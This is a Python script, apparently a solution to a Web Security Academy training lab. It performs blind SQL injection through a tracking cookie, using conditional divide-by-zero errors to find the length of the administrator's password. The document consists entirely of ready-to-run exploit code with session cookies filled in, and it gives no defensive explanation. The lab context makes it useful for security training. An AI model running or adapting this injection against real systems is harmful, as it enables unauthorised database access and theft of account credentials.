import requests

# Set the target URL
url = "https://0aef008f04667a9c83ee831e004800e8.web-security-academy.net/"

# Define session cookies
tracking_id = "cf0TIM6uE9oXtwj5"
session = "CN3T8AJ1GDQhTbXSNaVdhu020gESmoic"

# Detect password length
for length in range(1, 31):

    # Inject conditional error into TrackingId
    cookies = {
        "TrackingId": f"{tracking_id}' AND (SELECT CASE WHEN LENGTH(password) > {length} THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a'--",
        "session": session
    }

    # Send request and check HTTP response
    response = requests.get(url, cookies=cookies)

    # HTTP 500 indicates condition TRUE
    if response.status_code == 500:
        print(f"[+] Length > {length}: TRUE")

    # HTTP 200 indicates condition FALSE
    else:
        print(f"[+] Password length: {length}")
        break

